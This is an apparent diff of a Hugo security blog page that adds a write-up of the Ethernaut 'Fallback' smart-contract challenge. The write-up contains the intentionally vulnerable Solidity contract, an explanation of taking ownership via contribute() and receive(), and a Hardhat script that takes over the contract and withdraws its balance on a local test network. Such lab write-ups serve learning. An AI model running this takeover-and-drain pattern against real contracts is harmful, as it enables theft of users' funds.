@@ -14,11 +14,21 @@
 
     
         
-            <meta name="description" content="This is my new hugo site" />
+            <meta
+                name="description"
+                content="This is my new hugo site" />
         
 
         
-            <meta name="author" content="yoavshah" />
+            <meta
+                name="keywords"
+                content="security,cryptohack,writeups,cyber" />
+        
+
+        
+            <meta
+                name="author"
+                content="yoavshah" />
         
 
     
@@ -26,6 +36,7 @@
 
     <title>
         
+            1-fallback |
             SecurityBlog
         
     </title>
@@ -161,6 +172,7 @@
 
     <div class="header_middle">
         
+            1-fallback -
             SecurityBlog
         
     </div>
@@ -187,7 +199,7 @@
             
                 <li
                     
-                        class="dir closed-dir"
+                        class="dir opened-dir"
                     >
                     <span class="dir-text"> Blockchain </span>
 
@@ -255,7 +267,7 @@
             
                 <li
                     
-                        class="dir closed-dir"
+                        class="dir opened-dir"
                     >
                     <span class="dir-text"> ethernaut </span>
 
@@ -929,8 +941,6 @@
 
 
             
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-
     <article class="main">
         <button
     class="sidebar-toggle-btn"
@@ -942,812 +952,293 @@
 
 
 
-        <div class="home">
-            <div class="title">
+        <div class="title">
+            <h1 class="title-header">
+                1-fallback
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/yoavshah/"
+                                class="cat-btn">
+                                yoavshah
+                            </a>
+                        </div>
+                    
+
                 
 
                 
-                    <h1 class="title-caption">SecurityBlog</h1>
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.09.16"
+                            >2024.09.16
+                        </time>
+                    </div>
                 
 
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        2 mins to read
+                    </div>
                 
             </div>
-            <div class="recommend">
-                <div class="left">
-                    <div class="start">
-                        
-                            <h3 class="recommend-title">
-                                About me
-                            </h3>
-                            <p class="long-description">
-                                My name is Yoav Shaharabani, I am a cyber secruity researcher and analysit who likes to learn more at leisure hours.</br></br>For any further questions you can contact me on my linkedin page
-                            </p>
-                        
-						
-						</br>
-						</br>
-						
-						
-						
-						<a href="https://www.linkedin.com/in/yoavshah" target="_blank">
-						<i class="fa fa-linkedin-square" style="font-size:24px"></i>
-						</a>
-						&nbsp;&nbsp;
-						<a href="https://github.com/yoavshah" target="_blank">
-						<i class="fa fa-github" style="font-size:24px"></i>
-						</a>
+        </div>
 
-						
-					</div>
-                    <div class="recent">
-                        
-                    </div>
+        <div class="article-meta">
+            
+
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+    
+
+
+
+
+<a href="https://yoavshah.github.io/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="https://yoavshah.github.io/blockchain/" class="bread-btn">
+    
+
+    
+        Blockchain
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="https://yoavshah.github.io/blockchain/ethernaut/" class="bread-btn">
+    
+
+    
+        ethernaut
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="https://yoavshah.github.io/blockchain/ethernaut/1-fallback/" class="bread-btn">
+    
+
+    
+        
+            1-fallback
+        
+
+    
+</a>
+
                 </div>
-                
-                    <div class="right">
-                        <h3 class="recommend-title">
-                            Writeups
-                        </h3>
-						
-												
-						
-						
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
             
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> Blockchain </span>
 
-                    
+            
+        </div>
+
+        
+            <nav id="TableOfContents"></nav>
+        
+
+
+        <div class="content">
+            
+                <p>The description of the challenge</p>
 
 
 
+
+
+
+
+<div class="codeblock">
     
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="Look%20carefully%20at%20the%20contract%27s%20code%20below.%0d%0a%0d%0aYou%20will%20beat%20this%20level%20if%0d%0a%0d%0a%20%20%20%20you%20claim%20ownership%20of%20the%20contract%0d%0a%20%20%20%20you%20reduce%20its%20balance%20to%200">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
     
 
     
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>Look carefully at the <span style="color:#66d9ef">contract</span><span style="color:#e6db74">&#39;s code below.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You will beat this level <span style="color:#66d9ef">if</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    you claim ownership <span style="color:#66d9ef">of</span> the <span style="color:#66d9ef">contract</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">you</span> reduce its balance to <span style="color:#ae81ff">0</span></span></span></code></pre></div>
+    
+</div>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="//%20SPDX-License-Identifier:%20MIT%0d%0apragma%20solidity%20%5e0.8.0;%0d%0a%0d%0acontract%20Fallback%20%7b%0d%0a%20%20%20%20mapping%28address%20=%3e%20uint256%29%20public%20contributions;%0d%0a%20%20%20%20address%20public%20owner;%0d%0a%0d%0a%20%20%20%20constructor%28%29%20%7b%0d%0a%20%20%20%20%20%20%20%20owner%20=%20msg.sender;%0d%0a%20%20%20%20%20%20%20%20contributions[msg.sender]%20=%201000%20*%20%281%20ether%29;%0d%0a%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20modifier%20onlyOwner%28%29%20%7b%0d%0a%20%20%20%20%20%20%20%20require%28msg.sender%20==%20owner,%20%22caller%20is%20not%20the%20owner%22%29;%0d%0a%20%20%20%20%20%20%20%20_;%0d%0a%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20function%20contribute%28%29%20public%20payable%20%7b%0d%0a%20%20%20%20%20%20%20%20require%28msg.value%20%3c%200.001%20ether%29;%0d%0a%20%20%20%20%20%20%20%20contributions[msg.sender]%20&#43;=%20msg.value;%0d%0a%20%20%20%20%20%20%20%20if%20%28contributions[msg.sender]%20%3e%20contributions[owner]%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20owner%20=%20msg.sender;%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20function%20getContribution%28%29%20public%20view%20returns%20%28uint256%29%20%7b%0d%0a%20%20%20%20%20%20%20%20return%20contributions[msg.sender];%0d%0a%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20function%20withdraw%28%29%20public%20onlyOwner%20%7b%0d%0a%20%20%20%20%20%20%20%20payable%28owner%29.transfer%28address%28this%29.balance%29;%0d%0a%20%20%20%20%7d%0d%0a%0d%0a%20%20%20%20receive%28%29%20external%20payable%20%7b%0d%0a%20%20%20%20%20%20%20%20require%28msg.value%20%3e%200%20&amp;&amp;%20contributions[msg.sender]%20%3e%200%29;%0d%0a%20%20%20%20%20%20%20%20owner%20=%20msg.sender;%0d%0a%20%20%20%20%7d%0d%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
     
 
     
+        <pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
-    <ul class="section-tree">
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> smart-contracts-development </span>
+contract Fallback {
+    mapping(address =&gt; uint256) public contributions;
+    address public owner;
 
-                    
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
+    }
 
+    modifier onlyOwner() {
+        require(msg.sender == owner, &#34;caller is not the owner&#34;);
+        _;
+    }
 
+    function contribute() public payable {
+        require(msg.value &lt; 0.001 ether);
+        contributions[msg.sender] &#43;= msg.value;
+        if (contributions[msg.sender] &gt; contributions[owner]) {
+            owner = msg.sender;
+        }
+    }
 
+    function getContribution() public view returns (uint256) {
+        return contributions[msg.sender];
+    }
+
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
+        owner = msg.sender;
+    }
+}</code></pre>
     
+</div>
+<p>We can see that we can use the contribute function and send less than 0.001 ethers each contribute, when we get to current owner contributions we can become the owners. The problem is that the current owner has 1000 ethers in the contributions map, so we need to perform 1000 / 0.001 transactions of contributions which is 1,000,000 transactions, it is too much to perform&hellip;</p>
+<p>We can see that the <code>receive()</code> function which acts as the default function for getting payments. This function requires us to send some amount of ether and that our address already contribute some amount of ether</p>
+<p>So the solution for this challenge is to execute <code>contribute</code> and send some ether, then send payment without a function to execute <code>receive</code>, then the owner is set for our address and then we can just call <code>withdraw</code> and take all the ethers stored there.</p>
+<p>So the code to exploit this vulnerability is the following:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
     
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/blockchain/development/0-setting_up_environment/" title="./blockchain/development/0-setting_up_environment/">
-                        
-                            0-setting_up_environment
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/blockchain/development/1-kingofthehill/" title="./blockchain/development/1-kingofthehill/">
-                        
-                            1-KingOfTheHill
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> ethernaut </span>
-
-                    
-
-
-
-    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="const%20%7b%20ethers%20%7d%20=%20require%28%22hardhat%22%29;%0d%0a%0d%0a//%20npx%20hardhat%20console%20--network%20localhost%0d%0a//%20npx%20hardhat%20run%20--network%20localhost%20scripts/interact.js%0d%0aasync%20function%20main%20%28%29%20%7b%0d%0a%20%20%20%20const%20address%20=%20%270x5FbDB2315678afecb367f032d93F642f64180aa3%27;%0d%0a%20%20%20%20const%20TestContract%20=%20await%20ethers.getContractFactory%28%27TestContract%27%29;%0d%0a%20%20%20%20const%20testContract%20=%20TestContract.attach%28address%29;%0d%0a%0d%0a%20%20%20%20const%20[owner,%20addr1,%20addr2]%20=%20await%20ethers.getSigners%28%29;%0d%0a%0d%0a%20%20%20%20old_owner%20=%20await%20testContract.owner%28%29;%0d%0a%20%20%20%20console.log%28old_owner%29%0d%0a%20%20%20%20%0d%0a%20%20%20%20old_balance%20=%20await%20ethers.provider.getBalance%28await%20testContract.getAddress%28%29%29%0d%0a%20%20%20%20console.log%28old_balance%29%0d%0a%0d%0a%20%20%20%20contribute_result%20=%20await%20testContract.connect%28addr1%29.contribute%28%7b%0d%0a%20%20%20%20%20%20%20%20value:%201%0d%0a%20%20%20%20%7d%29;%0d%0a%0d%0a%20%20%20%20//%20console.log%28contribute_result%29;%0d%0a%0d%0a%20%20%20%20const%20tx%20=%20%7b%0d%0a%20%20%20%20%20%20%20%20to:%20address,%0d%0a%20%20%20%20%20%20%20%20value:%20ethers.parseEther%28%220.01%22%29,%0d%0a%20%20%20%20%7d;%0d%0a%0d%0a%20%20%20%20const%20transactionResponse%20=%20await%20addr1.sendTransaction%28tx%29;%0d%0a%20%20%20%20//%20console.log%28transactionResponse%29;%0d%0a%0d%0a%20%20%20%20newOwner%20=%20await%20testContract.owner%28%29;%0d%0a%20%20%20%20console.log%28newOwner%29%0d%0a%0d%0a%20%20%20%20withdraw_result%20=%20await%20testContract.connect%28addr1%29.withdraw%28%29;%0d%0a%20%20%20%20//%20console.log%28withdraw_result%29;%0d%0a%0d%0a%20%20%20%20current_balance%20=%20await%20ethers.provider.getBalance%28await%20testContract.getAddress%28%29%29%0d%0a%20%20%20%20console.log%28current_balance%29%0d%0a%7d%0d%0a%0d%0a%0d%0a%0d%0amain%28%29%0d%0a.then%28%28%29%20=%3e%20process.exit%280%29%29%0d%0a.catch%28error%20=%3e%20%7b%0d%0a%20%20%20%20console.error%28error%29;%0d%0a%20%20%20%20process.exit%281%29;%0d%0a%7d%29;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
     
 
     
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">ethers</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;hardhat&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// npx hardhat console --network localhost
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// npx hardhat run --network localhost scripts/interact.js
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span> () {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">address</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TestContract</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;TestContract&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">testContract</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">TestContract</span>.<span style="color:#a6e22e">attach</span>(<span style="color:#a6e22e">address</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> [<span style="color:#a6e22e">owner</span>, <span style="color:#a6e22e">addr1</span>, <span style="color:#a6e22e">addr2</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getSigners</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">old_owner</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">testContract</span>.<span style="color:#a6e22e">owner</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">old_owner</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">old_balance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getBalance</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">testContract</span>.<span style="color:#a6e22e">getAddress</span>())
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">old_balance</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">contribute_result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">testContract</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">addr1</span>).<span style="color:#a6e22e">contribute</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// console.log(contribute_result);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tx</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">address</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#34;0.01&#34;</span>),
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">transactionResponse</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">addr1</span>.<span style="color:#a6e22e">sendTransaction</span>(<span style="color:#a6e22e">tx</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// console.log(transactionResponse);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">newOwner</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">testContract</span>.<span style="color:#a6e22e">owner</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">newOwner</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">withdraw_result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">testContract</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">addr1</span>).<span style="color:#a6e22e">withdraw</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// console.log(withdraw_result);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">current_balance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">provider</span>.<span style="color:#a6e22e">getBalance</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">testContract</span>.<span style="color:#a6e22e">getAddress</span>())
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">current_balance</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(() =&gt; <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span>.<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">error</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div>
     
+</div>
+<p><a href="%5Cblockchain%5Cethernaut%5Cfallback%5Cinteract.js">fallback.js</a></p>
 
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/blockchain/ethernaut/0-setting_up_environment/" title="./blockchain/ethernaut/0-setting_up_environment/">
-                        
-                            0-setting_up_environment
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/blockchain/ethernaut/1-fallback/" title="./blockchain/ethernaut/1-fallback/">
-                        
-                            1-fallback
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> Cryptohack </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> diffie-helman </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/0-diffie_hellman_explained/" title="./cryptohack/diffie-hellman/0-diffie_hellman_explained/">
-                        
-                            0-diffie_hellman_explained
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/1-parameter_injection/" title="./cryptohack/diffie-hellman/1-parameter_injection/">
-                        
-                            1-parameter_injection
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/2-export_grade/" title="./cryptohack/diffie-hellman/2-export_grade/">
-                        
-                            2-export_grade
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/3-static_client/" title="./cryptohack/diffie-hellman/3-static_client/">
-                        
-                            3-static_client
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/4-additive/" title="./cryptohack/diffie-hellman/4-additive/">
-                        
-                            4-additive
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/5-static_client_2/" title="./cryptohack/diffie-hellman/5-static_client_2/">
-                        
-                            5-static_client_2
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/6-script_kiddie/" title="./cryptohack/diffie-hellman/6-script_kiddie/">
-                        
-                            6-script_kiddie
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/7-the_matrix/" title="./cryptohack/diffie-hellman/7-the_matrix/">
-                        
-                            7-the_matrix
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/8-the_matrix_reloaded/" title="./cryptohack/diffie-hellman/8-the_matrix_reloaded/">
-                        
-                            8-the_matrix_reloaded
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/diffie-hellman/9-the_matrix_revolutions/" title="./cryptohack/diffie-hellman/9-the_matrix_revolutions/">
-                        
-                            9-the_matrix_revolutions
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> hashes </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/1-collider/" title="./cryptohack/hashes/1-collider/">
-                        
-                            1-collider
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/2-hash_stuffing/" title="./cryptohack/hashes/2-hash_stuffing/">
-                        
-                            2-hash_stuffing
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/3-primed5/" title="./cryptohack/hashes/3-primed5/">
-                        
-                            3-PriMeD5
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/4-twin_keys/" title="./cryptohack/hashes/4-twin_keys/">
-                        
-                            4-twin_keys
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/5-no_difference/" title="./cryptohack/hashes/5-no_difference/">
-                        
-                            5-no_difference
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/6-md0/" title="./cryptohack/hashes/6-md0/">
-                        
-                            6-md0
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/7-mdflag/" title="./cryptohack/hashes/7-mdflag/">
-                        
-                            7-mdflag
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/8-mixed_up/" title="./cryptohack/hashes/8-mixed_up/">
-                        
-                            8-mixed_up
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/hashes/9-invariant/" title="./cryptohack/hashes/9-invariant/">
-                        
-                            9-invariant
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> rsa </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/rsa/0-rsa_explained/" title="./cryptohack/rsa/0-rsa_explained/">
-                        
-                            0-rsa_explained
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> symmetric </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
-    <ul class="section-tree">
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/01-passwords_as_keys/" title="./cryptohack/symmetric/01-passwords_as_keys/">
-                        
-                            01-passwords_as_keys
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/02-ecbcbcwtf/" title="./cryptohack/symmetric/02-ecbcbcwtf/">
-                        
-                            02-ecbcbcwtf
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/03-ecb_oracle/" title="./cryptohack/symmetric/03-ecb_oracle/">
-                        
-                            03-ecb_oracle
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/04-flipping_cookie/" title="./cryptohack/symmetric/04-flipping_cookie/">
-                        
-                            04-flipping_cookie
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/05-lazy_cbc/" title="./cryptohack/symmetric/05-lazy_cbc/">
-                        
-                            05-lazy_cbc
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/06-triple_des/" title="./cryptohack/symmetric/06-triple_des/">
-                        
-                            06-triple_des
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/07-symmetry/" title="./cryptohack/symmetric/07-symmetry/">
-                        
-                            07-symmetry
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/08-bean_counter/" title="./cryptohack/symmetric/08-bean_counter/">
-                        
-                            08-bean_counter
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/09-ctrime/" title="./cryptohack/symmetric/09-ctrime/">
-                        
-                            09-ctrime
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/10-logon_zero/" title="./cryptohack/symmetric/10-logon_zero/">
-                        
-                            10-logon_zero
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/11-stream_consciousness/" title="./cryptohack/symmetric/11-stream_consciousness/">
-                        
-                            11-stream_consciousness
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/12-dancing_queen/" title="./cryptohack/symmetric/12-dancing_queen/">
-                        
-                            12-dancing_queen
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/13-oh-snap/" title="./cryptohack/symmetric/13-oh-snap/">
-                        
-                            13-oh-snap
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/14-paper_plane/" title="./cryptohack/symmetric/14-paper_plane/">
-                        
-                            14-paper_plane
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/15-forbidden_fruit/" title="./cryptohack/symmetric/15-forbidden_fruit/">
-                        
-                            15-forbidden_fruit
-                        
-                    </a>
-                </li>
-            
-        
-            
-                <li class="file">
-                    <a href="https://yoavshah.github.io/cryptohack/symmetric/16-beatboxer/" title="./cryptohack/symmetric/16-beatboxer/">
-                        
-                            16-beatboxer
-                        
-                    </a>
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-    </ul>
-
-
-                </li>
-            
-        
-            
-                <li
-                    
-                        class="dir closed-dir"
-                    >
-                    <span class="dir-text"> Windows </span>
-
-                    
-
-
-
-    
-    
-
-    
-    
-
-    
-
